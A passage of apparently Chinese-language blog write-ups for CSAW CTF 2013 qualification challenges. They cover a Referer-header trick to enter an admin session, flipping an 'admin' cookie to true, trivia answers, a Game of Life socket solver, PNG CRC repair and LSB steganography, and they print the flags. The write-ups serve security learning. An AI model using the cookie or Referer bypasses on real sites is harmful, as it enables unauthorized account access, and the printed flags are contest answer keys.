login.png"></p><p>注册后登陆后，浏览网站所有页面后发现有两个基本功能：</p><blockquote><p>1.可以在不同用户互发消息<br>2.用户可以进行笔记创建编辑等</p></blockquote><p>最开始以为是针对这两个功能进行突破，不过搞了好久并没有什么收获，不过发现了一个值得注意的地方，不管进行什么操作，总会加上一堆长hash值且hash值一直不变，后来给了提示:Nevernote管理员会检查链接，于是便想到了。</p><p>我们通过发送消息的功能给admin发送一个链接(比如自己的博客地址)，然后管理员就会收消息访问链接，于是我们查看博客的访问日志中的来源记录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">128.238.66.214 - - [21/Sep/2013:16:07:29 +0400] &quot;GET / HTTP/1.1&quot; 200 28060 &quot;http://128.238.66.214</div><div class="line">/viewmessage.php?enc=zhc5qxq0UHeCENSowZ4i83LOuwP2xOeusmD%2BMwnG5JGRoG7ROrUWg%2BhIAMgqJJqefNt15FII51eu1</div><div class="line">op1W9yMjKq9Yrhn%2BkI0wt09sVMnqrMflOeyWwwb2MNBFxGPKRTM%2FSziEOtH1mZmVH%2Fh9Vu%2Bc3ipeAXjkFMpilOSpUPCD4Q</div><div class="line">%3D&quot; &quot;Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)&quot;</div></pre></td></tr></table></figure><p>于是构造请求，在Header里加入:<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Referer:http://128.238.66.214</div><div class="line">/viewmessage.php?enc=zhc5qxq0UHeCENSowZ4i83LOuwP2xOeusmD%2BMwnG5JGRoG7ROrUWg%2BhIAMgqJJqefNt15FII51eu1</div><div class="line">op1W9yMjKq9Yrhn%2BkI0wt09sVMnqrMflOeyWwwb2MNBFxGPKRTM%2FSziEOtH1mZmVH%2Fh9Vu%2Bc3ipeAXjkFMpilOSpUPCD4Q%3D</div></pre></td></tr></table></figure><p></p><p>成功登入，然后看到key的note，打开得到flag：</p><p><img src="https://www.hackfun.org/usr/uploads/2016/08/663842805.png" alt="CSAW CTF Qualification Round 2013 Web 200 Nevernote key.png"></p><pre><code>key{akjdsf98LolCats234lkas0!#@%23Ferrari134545!@#250saDucati9dfL$Jdc09234lkjasf}
</code></pre>]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> csaw ctf qualification round 2013 </tag>
            
            <tag> referer </tag>
            
            <tag> nevernote </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CSAW CTF Qualification Round 2013 Web 100 Guess Harder]]></title>
      <url>/2016/08/19/CSAW-CTF-Qualification-Round-2013--Web-100-Guess-Harder/</url>
      <content type="html"><![CDATA[<h2 id="0x00-题目"><a href="#0x00-题目" class="headerlink" title="0x00 题目"></a>0x00 题目</h2><blockquote><p><a href="http://128.238.66.215" target="_blank" rel="external">http://128.238.66.215</a></p></blockquote><h2 id="0x01-解题"><a href="#0x01-解题" class="headerlink" title="0x01 解题"></a>0x01 解题</h2><a id="more"></a><p>访问链接后，出现提示:</p><p><img src="https://www.hackfun.org/usr/uploads/2016/08/3960110511.png" alt="CSAW CTF Qualification Round 2013 Web 100 notice.png"></p><p>虽然提示说:你永远猜不到我的密码，但还是随手输入一些弱口令，多次测试不对于是习惯性F12，看到Cookie中admin值为’false’，于是修改为’true’，刷新之后出现flag:</p><pre><code>key{told_ya_you_wouldnt_guess_it}
</code></pre>]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> csaw ctf qualification round 2013 </tag>
            
            <tag> cookie </tag>
            
            <tag> writeup </tag>
            
            <tag> guess harder </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CSAW CTF Qualification Round 2013 Trivia 50]]></title>
      <url>/2016/08/18/CSAW-CTF-Qualification-Round-2013--Trivia-50/</url>
      <content type="html"><![CDATA[<h2 id="0x00-题目"><a href="#0x00-题目" class="headerlink" title="0x00 题目"></a>0x00 题目</h2><p><strong>Trivia 1</strong></p><blockquote><p>1.Drink all the booze, <em>__</em> all the things!</p></blockquote><p><strong>Trivia 2</strong></p><blockquote><p>2.What is the abbreviation of the research published in the Hackin9 issue on nmap by Jon Oberheide, Nico Waisman, Matthieu Suiche, Chris Valasek, Yarochkin Fyodor, the Grugq, Jonathan Brossard, and Mark Dowd?</p></blockquote><p><strong>Trivia 3</strong></p><blockquote><p>3.What is the common name for a single grouping of instructions used in a Return Oriented Programming payload, typically ending in a return (ret) instruction?</p></blockquote><p><strong>Trivia 4</strong></p><blockquote><p>4.What is the new web technology that provides a web browser full-duplex communication to a web server over a single connection?</p></blockquote><p><strong>Trivia 5</strong></p><blockquote><p>5.What is the x86 processor operating mode for running 64-bit code?</p></blockquote><h2 id="0x01-解题"><a href="#0x01-解题" class="headerlink" title="0x01 解题"></a>0x01 解题</h2><a id="more"></a><p>Trivia 1 <a href="http://lmgtfy.com/?q=Drink%20all%20the%20booze%2C%20____%20all%20the%20things!" target="_blank" rel="external">Click here!</a></p><pre><code>key{hack}
</code></pre><p>Trivia 2 <a href="http://lmgtfy.com/?q=Hackin9%20issue%20on%20nmap%20by%20Jon%20Oberheide%2C%20Nico%20Waisman%2C%20Matthieu%20Suiche%2C%20Chris%20Valasek%2C%20Yarochkin%20Fyodor%2C%20the%20Grugq%2C%20Jonathan%20Brossard%2C%20and%20Mark%20Dowd%3F" target="_blank" rel="external">Click here!</a></p><pre><code>key{dicks}
</code></pre><p>Trivia 3 <a href="http://lmgtfy.com/?q=What%20is%20the%20common%20name%20for%20a%20single%20grouping%20of%20instructions%20used%20in%20a%20Return%20Oriented%20Programming%20payload%2C%20typically%20ending%20in%20a%20return%20(ret)%20instruction%3F" target="_blank" rel="external">Click here!</a></p><pre><code>key{gadget}
</code></pre><p>Trivia 4 <a href="http://lmgtfy.com/?q=What%20is%20the%20new%20web%20technology%20that%20provides%20a%20web%20browser%20full-duplex%20communication%20to%20a%20web%20server%20over%20a%20single%20connection%3F" target="_blank" rel="external">Click here!</a></p><pre><code>key{websocket}
</code></pre><p>Trivia 5 <a href="http://lmgtfy.com/?q=What%20is%20the%20x86%20processor%20operating%20mode%20for%20running%2064-bit%20code%3F" target="_blank" rel="external">Click here!</a></p><pre><code>key{long mode}
</code></pre>]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ctf </tag>
            
            <tag> csaw ctf qualification round 2013 </tag>
            
            <tag> writeup </tag>
            
            <tag> trivia </tag>
            
            <tag> google </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CSAW CTF Qualification Round 2013 Misc 300 Life]]></title>
      <url>/2016/08/18/CSAW-CTF-Qualification-Round-2013--Misc-300-Life/</url>
      <content type="html"><![CDATA[<h2 id="0x00-题目"><a href="#0x00-题目" class="headerlink" title="0x00 题目"></a>0x00 题目</h2><blockquote><p><a href="http://en.wikipedia.org/wiki/Conways_Game_of_Life" target="_blank" rel="external">http://en.wikipedia.org/wiki/Conways_Game_of_Life</a></p><p>nc 128.238.66.216 45678</p></blockquote><h2 id="0x01-解题"><a href="#0x01-解题" class="headerlink" title="0x01 解题"></a>0x01 解题</h2><a id="more"></a><p>连接服务器后，会显示类似的图案:<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">##### Round 1: 25 Generations ##### </div><div class="line">####################### </div><div class="line">#           *         # </div><div class="line">#*         *          # </div><div class="line"># *                 * # </div><div class="line"># * **        *    ***# </div><div class="line"># **  *      **       # </div><div class="line">#**    *       *      # </div><div class="line"># *             *     # </div><div class="line">#      *        *     # </div><div class="line">#     *    * *   *    # </div><div class="line">#  * *                # </div><div class="line"># *              *    # </div><div class="line">#     *           *   # </div><div class="line">#       *             # </div><div class="line">#           **        # </div><div class="line">#      *              # </div><div class="line">#                     # </div><div class="line">#                *    # </div><div class="line">#         **          # </div><div class="line">#        *     *     *# </div><div class="line">#       *    *  **  * # </div><div class="line">#######################</div></pre></td></tr></table></figure><p></p><p>先介绍一下<a href="https://zh.wikipedia.org/wiki/%E5%BA%B7%E5%A8%81%E7%94%9F%E5%91%BD%E6%B8%B8%E6%88%8F" target="_blank" rel="external">康威生命游戏</a>（Conway’s Game of Life）</p><p><img src="https://www.hackfun.org/usr/uploads/2016/08/2867004153.gif" alt="Gospers_glider_gun.gif"></p><p>玩过<a href="https://zh.wikipedia.org/wiki/%E5%BA%B7%E5%A8%81%E7%94%9F%E5%91%BD%E6%B8%B8%E6%88%8F" target="_blank" rel="external">康威生命游戏</a>（Conway’s Game of Life）都知道其中规则和原理，如果不知道可以了解一下：</p><p>生命游戏中，对于任意细胞(用方格表示)，<strong>规则</strong>如下：<br>每个细胞有两种状态-存活或死亡，每个细胞与以自身为中心的周围八格细胞产生互动。（如图，黑色为存活，白色为死亡）</p><blockquote><p>1.当前细胞为存活状态时，当周围低于2个（不包含2个）存活细胞时， 该细胞变成死亡状态。（模拟生命数量稀少）<br>2.当前细胞为存活状态时，当周围有2个或3个存活细胞时， 该细胞保持原样。<br>3.当前细胞为存活状态时，当周围有3个以上的存活细胞时，该细胞变成死亡状态。（模拟生命数量过多）<br>4.当前细胞为死亡状态时，当周围有3个存活细胞时，该细胞变成存活状态。 （模拟繁殖）</p></blockquote><p>可以把最初的细胞结构定义为种子，当所有在种子中的细胞同时被以上规则处理后, 可以得到第一代细胞图。按规则继续处理当前的细胞图，可以得到下一代的细胞图，周而复始。</p><p>我们可以把计算机中的宇宙想象成是一堆方格子构成的封闭空间，尺寸为N的空间就有N x N个格子，这里’#’用来表示边界。而每一个格子都可以看成是一个生命体，每个生命都有生和死两种状态，如果该格子生就用’*’显示，死则显示空白。每一个格子旁边都有邻居格子存在，如果我们把3x3的9个格子构成的正方形看成一个基本单位的话，那么这个正方形中心的格子的邻居就是它旁边的8个格子。</p><p>每个格子的生死遵循下面的原则：</p><blockquote><p>1.如果一个细胞周围有3个细胞为生（一个细胞周围共有8个细胞），则该细胞为生（即该细胞若原先为死，则转为生，若原先为生，则保持不变） 。<br>2.如果一个细胞周围有2个细胞为生，则该细胞的生死状态保持不变；<br>3.在其它情况下，该细胞为死（即该细胞若原先为生，则转为死，若原先为死，则保持不变）</p></blockquote><p>设定图像中每个像素的初始状态后依据上述的游戏规则演绎生命的变化，由于初始状态和迭代次数不同，将会得到令人叹服的优美图案。</p><p>了解完基本规则和原理之后，我们再来尝试做题，题目要求在较短的时间内将给出的当前世界(每个细胞的存活状态情况)的下一代的变化世界(下一代每个细胞的存活状态情况)，实际上就是一道<strong>根据规则socket编程题目</strong>，这里给出<a href="http://shellphish.net/" target="_blank" rel="external">Shellphish</a>中<a href="https://cao.vc/" target="_blank" rel="external">cao</a>的参考示例：<br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python3 </span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*- </span></div><div class="line"> </div><div class="line">__author__ = <span class="string">"cao"</span> </div><div class="line">__description__ = <span class="string">"csaw2013q: misc300/life; game of life solver"</span> </div><div class="line">__version__ = <span class="string">"1.0-cleanedup"</span> </div><div class="line"> </div><div class="line"> </div><div class="line"><span class="keyword">from</span> re <span class="keyword">import</span> compile </div><div class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> socket </div><div class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep </div><div class="line"> </div><div class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> array, int8 </div><div class="line"><span class="keyword">from</span> scipy.ndimage.filters <span class="keyword">import</span> convolve </div><div class="line"> </div><div class="line"> </div><div class="line">weights = array([[<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">10</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>]]) </div><div class="line">re_round_generations = compile(<span class="string">"##### Round (?P&lt;round&gt;[0-9]+): "</span> </div><div class="line">                               <span class="string">"(?P&lt;generations&gt;[0-9]+) Generations #####"</span>) </div><div class="line"> </div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">step</span><span class="params">(world)</span>:</span> </div><div class="line">    <span class="comment"># alternative method is: wrap </span></div><div class="line">    conv = convolve(world, weights, mode=<span class="string">"constant"</span>) </div><div class="line">    <span class="keyword">return</span> int8((conv == <span class="number">3</span>) | (conv == <span class="number">12</span>) | (conv == <span class="number">13</span>)) </div><div class="line"> </div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">_decode</span><span class="params">(i)</span>:</span> </div><div class="line">    <span class="keyword">if</span> i == <span class="string">"*"</span>: </div><div class="line">        <span class="keyword">return</span> <span class="number">1</span> </div><div class="line">    <span class="keyword">else</span>: </div><div class="line">        <span class="keyword">return</span> <span class="number">0</span> </div><div class="line"> </div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">_encode</span><span class="params">(i)</span>:</span> </div><div class="line">    <span class="keyword">if</span> i: </div><div class="line">        <span class="keyword">return</span> <span class="string">"*"</span> </div><div class="line">    <span class="keyword">else</span>: </div><div class="line">        <span class="keyword">return</span> <span class="string">" "</span> </div><div class="line"> </div><div class="line"><span class="comment"># ================================== </span></div><div class="line"> </div><div class="line">s = socket() </div><div class="line">s.connect((<span class="string">"128.238.66.216"</span>, <span class="number">45678</span>)) </div><div class="line"> </div><div class="line">f = s.makefile() </div><div class="line"> </div><div class="line"><span class="keyword">for</span> _round <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">101</span>): </div><div class="line">    print(<span class="string">"Round: &#123;&#125;\r"</span>.format(_round), end=<span class="string">""</span>) </div><div class="line">    f.readline()    <span class="comment"># Read the one empty line </span></div><div class="line">    match = re_round_generations.match(f.readline()) </div><div class="line">    generations = int(match.group(<span class="string">"generations"</span>)) </div><div class="line"> </div><div class="line">    border = f.readline().strip() </div><div class="line">    width = len(border) </div><div class="line"> </div><div class="line">    <span class="comment"># read in world and convert to numbers </span></div><div class="line">    world = [] </div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>: </div><div class="line">        ls = f.readline().strip() </div><div class="line">        <span class="keyword">if</span> ls.startswith(<span class="string">"##"</span>): </div><div class="line">            <span class="keyword">break</span> </div><div class="line"> </div><div class="line">        ls = ls[<span class="number">1</span>:<span class="number">-1</span>] </div><div class="line">        world.append([_decode(l) <span class="keyword">for</span> l <span class="keyword">in</span> ls]) </div><div class="line"> </div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(generations): </div><div class="line">        world = step(world) </div><div class="line"> </div><div class="line">    solution = [<span class="string">""</span>.join(_encode(i) <span class="keyword">for</span> i <span class="keyword">in</span> b) <span class="keyword">for</span> b <span class="keyword">in</span> world] </div><div class="line">    game = <span class="string">"\n"</span>.join(<span class="string">"#&#123;&#125;#"</span>.format(i) <span class="keyword">for</span> i <span class="keyword">in</span> solution) </div><div class="line">    total = <span class="string">"&#123;0&#125;\n&#123;1&#125;\n&#123;0&#125;\n"</span>.format(border, game) </div><div class="line">    s.send(bytes(total, <span class="string">"ascii"</span>)) </div><div class="line"> </div><div class="line"><span class="comment"># give them a second to catch up, we got big internet tubes </span></div><div class="line">sleep(<span class="number">1</span>) </div><div class="line"> </div><div class="line">print(str(s.recv(<span class="number">4096</span>)).strip())</div></pre></td></tr></table></figure><p></p><p>最后结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Congratulations!You made it!Here&apos;s your prize: key&#123;that comp sci assignment was useful after all&#125;</div></pre></td></tr></table></figure><p>如果你感兴趣，可以去体验一下<a href="http://www.bitstorm.org/gameoflife/" target="_blank" rel="external">在线模拟康威生命游戏</a>。</p>]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
            <tag> python </tag>
            
            <tag> csaw ctf qualification round 2013 </tag>
            
            <tag> 康威生命游戏 </tag>
            
            <tag> conway&#39;s game of life </tag>
            
            <tag> socket编程 </tag>
            
            <tag> miscellaneous </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CSAW CTF Qualification Round 2013 Misc 200 deadbeef]]></title>
      <url>/2016/08/17/CSAW-CTF-Qualification-Round-2013--Misc-200-deadbeef/</url>
      <content type="html"><![CDATA[<h2 id="0x00-题目"><a href="#0x00-题目" class="headerlink" title="0x00 题目"></a>0x00 题目</h2><p><a href="https://github.com/ctfs/write-ups-2013/blob/master/csaw-quals-2013/misc/deeeeeeaaaaaadbeeeeeeeeeef-200/IMG_0707.png" target="_blank" rel="external">IMG_0707.png</a></p><h2 id="0x01-解题"><a href="#0x01-解题" class="headerlink" title="0x01 解题"></a>0x01 解题</h2><a id="more"></a><p>下载图片能在Windows上能成功浏览图片：</p><p><img src="https://www.hackfun.org/usr/uploads/2016/08/3623850114.gif" alt="IMG_0707.gif"></p><p>但是当在Linux打开却发现CRC error:</p><p><img src="https://www.hackfun.org/usr/uploads/2016/08/1545138618.gif" alt="CSAW CTF Qualification Round 2013 Misc 200 deadbeef crc error.gif"></p><p>使用<a href="https://github.com/rvong/png-debugger" target="_blank" rel="external">PNGDebugger</a>检查图片CRC<br></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">C:\png-debugger-master\Debug&gt;PNGDebugger.exe IMG_0707.png</div><div class="line">        ----</div><div class="line">file-path=IMG_0707.png</div><div class="line">file-size=6214620 bytes</div><div class="line"></div><div class="line">0x00000000      png-signature=0x89504E470D0A1A0A</div><div class="line"></div><div class="line">0x00000008      chunk-length=0x0000000D (13)</div><div class="line">0x0000000C      chunk-type='IHDR'</div><div class="line">0x00000010      width=0x00000CC0        (3264)</div><div class="line">0x00000014      height=0x00000691       (1681)</div><div class="line">0x00000018      bit-depth=8</div><div class="line">0x00000019      color-type=6    (truecolour with alpha)</div><div class="line">0x0000001A      compression-method=0    (deflate/inflate)</div><div class="line">0x0000001B      filter-method=0         (adaptive)</div><div class="line">0x0000001C      interlace-method=0      (standard)</div><div class="line">0x0000001D      crc-code=0xC1D0B3E4</div><div class="line"><span class="meta">&gt;</span>&gt; (CRC CHECK)  crc-computed=0xFCC410A8         =&gt;      CRC FAILED</div><div class="line">...</div></pre></td></tr></table></figure><p></p><p>参考资料:<a href="http://blog.chinaunix.net/uid-20622737-id-3130430.html" target="_blank" rel="external">PNG文件结构分析</a><br>发现图片的IHDR(文件头数据块)的CRC(循环冗余检测)不对，而其他的数据块的CRC都是正确的，根据题目意思推测：原本的CRC应该是0xC1D0B3E4，但是可能修改IHDR里的某个域的值导致计算出CRC为0xFCC410A8，从而导致校对失败。</p><p><img src="https://www.hackfun.org/usr/uploads/2016/08/2616766907.gif" alt="CSAW CTF Qualification Round 2013 Misc 200 deadbeef IHDR.gif"></p><p>综合下来，推测最有可能修改的域应该就是宽度和高度，之后通过<a href="http://www.sno.phy.queensu.ca/~phil/exiftool/" target="_blank" rel="external">exiftool</a>又了解了一些<a href="http://baike.baidu.com/view/22006.htm" target="_blank" rel="external">exif信息</a>：<br></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">E:\exiftool-10.25&gt;"exiftool(-k).exe" IMG_0707.png</div><div class="line">ExifTool Version Number         : 10.25</div><div class="line">File Name                       : IMG_0707.png</div><div class="line">Directory                       : .</div><div class="line">File Size                       : 5.9 MB</div><div class="line">File Modification Date/Time     : 2016:08:17 12:46:20+08:00</div><div class="line">File Access Date/Time           : 2016:08:17 19:04:02+08:00</div><div class="line">File Creation Date/Time         : 2016:08:17 19:04:02+08:00</div><div class="line">File Permissions                : rw-rw-rw-</div><div class="line">File Type                       : PNG</div><div class="line">File Type Extension             : png</div><div class="line">MIME Type                       : image/png</div><div class="line">Image Width                     : 3264</div><div class="line">Image Height                    : 1681</div><div class="line">Bit Depth                       : 8</div><div class="line">Color Type                      : RGB with Alpha</div><div class="line">Compression                     : Deflate/Inflate</div><div class="line">Filter                          : Adaptive</div><div class="line">Interlace                       : Noninterlaced</div><div class="line">SRGB Rendering                  : Perceptual</div><div class="line">Gamma                           : 2.2</div><div class="line">Pixels Per Unit X               : 2835</div><div class="line">Pixels Per Unit Y               : 2835</div><div class="line">Pixel Units                     : meters</div><div class="line">Source                          : iPhone 5</div><div class="line">Software                        : 6.1.4</div><div class="line">Modify Date                     : 2013:09:10 22:03:32</div><div class="line">Creation Time                   : 2013:09:10 22:03:32</div><div class="line">Image Size                      : 3264x1681</div><div class="line">Megapixels                      : 5.5</div></pre></td></tr></table></figure><p></p><p>得知可能是由iPhone 5手机拍摄，然后通过<a href="http://bbs.feng.com/read-htm-tid-5657274.html" target="_blank" rel="external">搜索</a>发现iPhone 5拍摄默认分辨率为3264×2448，也就是可能修改了图片的高度，所以试着修改图片高度：</p><p><img src="https://www.hackfun.org/usr/uploads/2016/08/1628300722.gif" alt="CSAW CTF Qualification Round 2013 Misc 200 deadbeef original.gif"></p><p>题图给出的高度是1681(0x00000691)，修改为2448(0x00000990)<br><img src="https://www.hackfun.org/usr/uploads/2016/08/2335060224.gif" alt="CSAW CTF Qualification Round 2013 Misc 200 deadbeef modified.gif"></p><p>之后再用PNGDebugger检测图片CRC：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">C:\png-debugger\Debug&gt;PNGDebugger.exe --verbose solved.png</div><div class="line">        ----</div><div class="line">file-path=solved.png</div><div class="line">file-size=6214620 bytes</div><div class="line"></div><div class="line">0x00000000      png-signature=0x89504E470D0A1A0A</div><div class="line"></div><div class="line">0x00000008      chunk-length=0x0000000D (13)</div><div class="line">0x0000000C      chunk-type='IHDR'</div><div class="line">0x00000010      width=0x00000CC0        (3264)</div><div class="line">0x00000014      height=0x00000990       (2448)</div><div class="line">0x00000018      bit-depth=8</div><div class="line">0x00000019      color-type=6    (truecolour with alpha)</div><div class="line">0x0000001A      compression-method=0    (deflate/inflate)</div><div class="line">0x0000001B      filter-method=0         (adaptive)</div><div class="line">0x0000001C      interlace-method=0      (standard)</div><div class="line">0x0000001D      crc-code=0xC1D0B3E4</div><div class="line"><span class="meta">&gt;</span>&gt; (CRC CHECK)  crc-computed=0xC1D0B3E4         =&gt;      CRC OK!</div><div class="line">...</div></pre></td></tr></table></figure><p>现在CRC校对成功，说明图片的原始高度是2448，打开图片得到flag:</p><p><img src="https://www.hackfun.org/usr/uploads/2016/08/780738801.gif" alt="CSAW CTF Qualification Round 2013 Misc 200 deadbeef original solved.gif"></p>]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
            <tag> forensics </tag>
            
            <tag> steganography </tag>
            
            <tag> csaw ctf qualification round 2013 </tag>
            
            <tag> crc error in chunk ihdr </tag>
            
            <tag> pngdebugger </tag>
            
            <tag> exiftool </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CSAW CTF Qualification Round 2013 Misc 100 Black White]]></title>
      <url>/2016/08/16/CSAW-CTF-Qualification-Round-2013--Misc-100-Black-White/</url>
      <content type="html"><![CDATA[<h2 id="0x00-题目"><a href="#0x00-题目" class="headerlink" title="0x00 题目"></a>0x00 题目</h2><blockquote><p><a href="https://github.com/ctfs/write-ups-2013/blob/master/csaw-quals-2013/misc/black-and-white-100/chal.png" target="_blank" rel="external">chal.png</a></p></blockquote><h2 id="0x01-解题"><a href="#0x01-解题" class="headerlink" title="0x01 解题"></a>0x01 解题</h2><p>下载<a href="https://github.com/ctfs/write-ups-2013/blob/master/csaw-quals-2013/misc/black-and-white-100/chal.png" target="_blank" rel="external">图片</a>打开发现是一片空白，图片是png格式，24位深度，一般是R、G、B通道各占8位，根据题目标题和图片文件名推测可能是一道基于LSB隐藏的隐写题目。使用stegsolve打开图片浏览R、G、B通道最低位(第0位)发现隐藏信息:</p><a id="more"></a><p><img src="https://www.hackfun.org/usr/uploads/2016/08/2653264204.gif" alt="CSAW CTF Qualification Round 2013 Misc 100 forensics.gif"></p><p>flag:key{forensics_is_fun}</p>]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ctf </tag>
            
            <tag> forensics </tag>
            
            <tag> steganography </tag>
            
            <tag> csaw ctf qualification round 2013 </tag>
            
            <tag> steg </tag>
            
            <tag> stegsolve </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CSAW CTF Qualification Round 2013 Misc 50 Networking 2]]></title>
      <url>/2016/08/16/CSAW-CTF-Qualification-Round-2013--Misc-50-Networking-2/</url>
      <content type="html"><![CDATA[<h2 id="0x00-题目"><a href="#0x00-题目" class="headerlink" title="0x00 题目"></a>0x00 题目</h2><blockquote><p><a href="https://github.com/ctfs/write-ups-2013/blob/master/csaw-quals-2013/misc/network2-50/networking.pcap" target="_blank" rel="external">networking.pcap</a></p><p><a href="https://github.com/ctfs/write-ups-2013/blob/master/csaw-quals-2013/misc/network2-50/networking.pcap.process" target="_blank" rel="external">networking.pcap.process</a></p></blockquote><h2 id="0x01-解题"><a href="#0x01-解题" class="headerlink" title="0x01 解题"></a>0x01 解题</h2><p>通过生成Networking 1的networking.pcap和Networking 2的networking.pcap文件MD5指纹信息，发现是相同文件，所以试图在networking.pcap.process文件里找出flag:</p><a id="more"></a><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line">root@kali:~# strings networking.pcap.process </div><div 